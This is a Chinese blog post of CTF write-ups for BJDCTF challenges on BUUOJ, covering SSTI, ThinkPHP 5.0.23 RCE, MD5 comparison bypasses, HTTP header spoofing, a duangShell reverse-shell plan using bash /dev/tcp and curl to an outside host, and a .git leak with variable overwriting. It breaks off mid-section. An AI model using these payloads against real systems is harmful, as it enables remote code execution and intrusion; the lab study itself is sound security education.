<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>记BJDCTF on BUUOJ | R4in1's Blog</title><meta name="author" content="R4in1,1582612801@qq.com"><meta name="copyright" content="R4in1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="干啥啥不行，签到第一名 [BJDCTF 2nd]签到-y1ngcrypto签到，直接base64解码 [BJDCTF 2nd]fake googlesstipayload： 1qaq?name&#x3D;&amp;#123;&amp;#123;&quot;&quot;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&amp;">
<meta property="og:type" content="article">
<meta property="og:title" content="记BJDCTF on BUUOJ">
<meta property="og:url" content="https://r4in1.github.io/2020/12/02/%E8%AE%B0BJDCTF-on-BUUOJ/index.html">
<meta property="og:site_name" content="R4in1&#39;s Blog">
<meta property="og:description" content="干啥啥不行，签到第一名 [BJDCTF 2nd]签到-y1ngcrypto签到，直接base64解码 [BJDCTF 2nd]fake googlesstipayload： 1qaq?name&#x3D;&amp;#123;&amp;#123;&quot;&quot;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&amp;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg">
<meta property="article:published_time" content="2020-12-02T12:37:25.000Z">
<meta property="article:modified_time" content="2020-12-02T12:42:37.349Z">
<meta property="article:author" content="R4in1">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://r4in1.github.io/2020/12/02/%E8%AE%B0BJDCTF-on-BUUOJ/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}

// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
const getScript = url => new Promise((resolve, reject) => {
  const script = document.createElement('script')
  script.src = url
  script.async = true
  script.onerror = reject
  script.onload = script.onreadystatechange = function() {
    const loadState = this.readyState
    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
    script.onload = script.onreadystatechange = null
    resolve()
  }
  document.head.appendChild(script)
})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2020-12-02 20:42:37'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="R4in1's Blog" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/R4in1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">R4in1's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">记BJDCTF on BUUOJ</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-02T12:37:25.000Z" title="发表于 2020-12-02 20:37:25">2020-12-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-12-02T12:42:37.349Z" title="更新于 2020-12-02 20:42:37">2020-12-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>干啥啥不行，签到第一名</p>
<h3 id="BJDCTF-2nd-签到-y1ng"><a href="#BJDCTF-2nd-签到-y1ng" class="headerlink" title="[BJDCTF 2nd]签到-y1ng"></a>[BJDCTF 2nd]签到-y1ng</h3><p>crypto签到，直接base64解码</p>
<h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><p>ssti<br>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name&#x3D;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat ..&#x2F;flag&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>参考：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6885">https://xz.aliyun.com/t/6885</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/keithtt/p/7709445.html">https://www.cnblogs.com/keithtt/p/7709445.html</a></p>
<h3 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h3><ul>
<li>考点：thinkPHPv5.0.23 RCE</li>
</ul>
<p>打开靶机是一个黑页，然后给了提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powered By THINKPHP5</span><br></pre></td></tr></table></figure>
<p>RCE（remote code execution）<br>THINKPHP5远程代码执行漏洞：<br><a href="">https://www.cnblogs.com/bmjoker/p/10110868.html</a><br><a href="">https://www.freebuf.com/vuls/191847.html</a></p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php&#x2F;?s&#x3D;captcha</span><br><span class="line"></span><br><span class="line">post_data:</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>提交111，用burpsuite拦截可以看到response的header中有hint：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: select * from &#39;admin&#39; where password&#x3D;md5($pass,true)</span><br></pre></td></tr></table></figure>
<p>貌似是以赛抗“疫”里也有这个考点，php中<code>md5()</code>函数的第二个参数如果是<code>true</code>的话，md5之后可返回的字符串中能会出现单引号，payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop | 276f722736c95d99e921722cf9ed621c | b&quot;&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c&quot;</span><br></pre></td></tr></table></figure>
<p>然后mysql中，以非‘0’字符开头的字符串转为bool值时，会转为true</p>
<p>这里有个疑问，这一题的源码是直接用<code>if($password==&#39;ffifdyop&#39;)</code>来判断的结果，而不是连接数据库，那么如果用含有<code>&#39;=&#39;</code>的md5值其实也可以绕过判断，利用<code>select &#39;a&#39;=&#39;b&#39;=&#39;c&#39;</code>返回true的特性来绕过（这是上次安恒的群里发的比赛的考点）</p>
<p>可参考下面这篇文章的评论区<br><a target="_blank" rel="noopener" href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/">http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</a></p>
<p>然后转到页面<code>DO YOU LIKE MD5</code>，页面中有注释：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; md5(<span class="variable">$a</span>) == md5(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p>要求参数不相但md5值相等，用的弱比较<code>==</code>和<code>!=</code>，可以用<code>0e</code>开头的字符串绕过，php中的<code>md5()</code>和<code>sha1()</code>之类的函数在传入参数为数组时，会直接返回<code>false</code>，所以也可以直接传入两个数组作为参数来绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?a&#x3D;QNKCDZO&amp;b&#x3D;s878926199a</span><br></pre></td></tr></table></figure>
<p>然后下一步要求：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用post方式传递两个数组作为参数，payload：</p>
<p>post_data<br>param1[]=1¶m2[]=2</p>
<h3 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h3><p>打开之后是个登录界面，随便输了个密码就可以登录，但是登陆之后什么都没有只有一个欢迎界面，burpsuite截包，可以看到个302页面中有个注释<code>L0g1n.php</code></p>
<p>访问L0g1n.php，回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry, this site will be available after totally 99 years!</span><br></pre></td></tr></table></figure>
<p>看到发送的请求中的<code>cookie</code>存在<code>time=xxxxx</code>，修改该属性的值，在后面多加几个9，回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry, this site is only optimized for those who comes from localhost</span><br></pre></td></tr></table></figure>
<p>后面就全部是修改<code>header</code>的问题了，参考相关链接</p>
<p><a href='https://www.cnblogs.com/jxl1996/p/10245958.html' target='_blank' rel="noopener noreferrer">http header </a></p>
<p>据出题人的题解，比较坑的是，当修改<code>X-Forwarded-For</code>为127.0.0.1时回显：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Do u think that I dont know X-Forwarded-For?</span><br><span class="line">Too young too simple sometimes naive</span><br></pre></td></tr></table></figure>
<p>可以用<code>Client-IP</code>或者<code>X-Real-ip</code>代替<code>XFF</code><br>还有个比较坑的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry, this site is only optimized for browsers that run on Commodo 64</span><br></pre></td></tr></table></figure>
<p>出题人说可以搜到Commodo 64暗示的是一个操作系统，可以搜到Commodore 64（虽然我并没有搜到，没梯子），修改UA为<code>Commodore 64</code>，其他需要修改的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Client-IP: 127.0.0.1      &#x2F;&#x2F;客户端ip</span><br><span class="line">From: root@gem-love.com   &#x2F;&#x2F;email</span><br><span class="line">VIA: y1ng.vip             &#x2F;&#x2F;http proxy</span><br><span class="line">Referer: gem-love.com     &#x2F;&#x2F;来源</span><br></pre></td></tr></table></figure>
<p>最终的页面备注里有base64编码的flag</p>
<h3 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h3><p>打开靶机之后回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">珍爱网</span><br><span class="line">how can i give you source code? .swp?!</span><br><span class="line">where is P3rh4ps&#39;s girl friend ???</span><br></pre></td></tr></table></figure>
<p><code>.swp</code>文件是非正常关闭vi/vim时产生的文件，可以用方便vim恢复原来的工作（类似临时文件？），可以用<code>vim -r filename</code>恢复编辑文件的内容</p>
<p>访问<code>/.index.php.swp</code>，使用vim恢复源代码，然后<code>:11,26 w ./index,php</code>将代码部分保存到新的index.php中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;how can i give you source code? .swp?!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;girl_friend&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;where is P3rh4ps&#x27;s girl friend ???&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$girl</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;girl_friend&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\&gt;|\\\/&#x27;</span>, <span class="variable">$girl</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;just girl&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;</span>, <span class="variable">$girl</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec(<span class="variable">$girl</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>exec()</code>函数与<code>system()</code>不一样，是没有运行结果回显的，所以这一题要用到反弹shell，不过我一直没搞明白buuoj上的靶机怎么用，所以这一题还没搞出来，大致思路：</p>
<p>先在服务器上创建个文件<code>shell.txt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip1]&#x2F;[port1] 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>然后在ip1服务器上用nc监听port1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp [port1]</span><br></pre></td></tr></table></figure>
<p>然后放payload，访问靶机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_data: girl_friend&#x3D;curl ip1&#x2F;shell.txt</span><br></pre></td></tr></table></figure>
<p>然后在服务器ip1上可以收到反弹的shell</p>
<p><a href='https://www.jianshu.com/p/6aca9b29514d' target='_blank' rel="noopener noreferrer">Linux下反弹shell几种方法学习总结</a></p>
<h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>dirsearch扫描可以发现有<code>/.git/</code>目录，使用<code>GitHack</code>可以把代码down下来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#dirsearch</span><br><span class="line">python dirsearch.py -u http:&#x2F;&#x2F;xxx -e php</span><br><span class="line"></span><br><span class="line">#GitHach</span><br><span class="line">python2 GitHack.py http:&#x2F;&#x2F;xxx&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
<p>首页中的php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;<span class="comment">//get yds=flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>审计代码，$连用可以导致变量覆盖，代码中的<code>foreach()</code>用于给变量赋值，将传递的参数逐个赋值给相应的变量。如果get传递参数<code>?yds=flag</code>，第二个foreach循环会执行$yds=$flag，因为没有传递名为flag的参数，所以第三个foreach并不会exit，到第一个if语句的时候，因为没有传递flag参数，所以会exit($yds)，但是刚刚$yds已经被赋值$flag了，所以可以get flag</p>
<h3 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h3><p>robots.txt中提示有hint.txt，hint.txt</p>
